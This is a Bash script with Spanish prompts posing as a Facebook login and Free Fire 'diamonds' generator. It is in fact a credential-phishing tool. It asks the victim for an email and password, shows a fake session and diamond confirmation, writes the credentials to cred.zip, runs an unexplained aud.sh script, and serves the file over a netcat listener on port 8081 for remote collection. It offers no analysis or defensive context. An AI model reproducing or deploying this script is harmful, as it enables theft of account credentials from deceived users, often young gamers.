#! /bin/bash

setterm -foreground blue
echo "           ------------"
echo -e "           | \e[1;34;47mFacebook\e[0m \e[1;34m|\e[0m"
setterm -foreground blue
echo "------------------------------------"
echo -e "\e[1;34m|\e[0m\e[1;37;44m[+]Ingresa tu correo electronico: \e[0m\e[1;34m|\e[0m"
echo -e "\e[1;34m|\e[0m                                  \e[1;34m|\e[0m"
echo -n -e " \e[1;34m> \e[0m"
read a
setterm -foreground blue
echo "----------------------------"
echo -e "\e[1;34m|\e[0m\e[1;37;44m[+]Ingresa tu contraseña: \e[0m\e[1;34m|\e[0m"
echo -e "\e[1;34m|\e[0m                          \e[1;34m|\e[0m"
echo -n -e " \e[1;34m> \e[0m"
read b
sleep 3
echo ""
setterm -foreground blue
echo "       ------------------"
echo -e "       |Session Iniciada|"
echo "       ------------------"
echo ""
echo -n "[+]Ingresa los diamantes que deseas > "
read c
echo ""
echo -e "\e[1;37;41m$c 💎 Diamantes agregando a su cuenta de FF\e[0m"
echo ""
echo "credenciales = $a $b" > cred.zip
echo "☆ Debe esperar a que haga conexion"
echo "☆ Ejemplo : Connection received"
bash aud.sh & nc -lvp 8081 < cred.zip
